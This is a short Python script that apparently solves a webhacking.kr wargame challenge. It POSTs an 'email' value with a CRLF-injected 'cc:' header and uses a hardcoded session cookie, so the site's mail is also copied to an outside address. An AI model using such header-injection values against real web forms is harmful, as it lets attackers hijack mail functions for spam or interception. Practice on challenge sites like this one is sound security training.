import requests

url = "http://webhacking.kr/challenge/bonus/bonus-11/index.php"

data = {
	"email":"abc.naver.com\r\ncc:clejrcnd@gmail.com"
}

headers = {
	"Cookie":"PHPSESSID=796c524a5dee9f2dd841854840012bb1",
	"Host":"webhacking.kr"
}

req = requests.post(url, data=data, headers=headers)
print repr(req.content)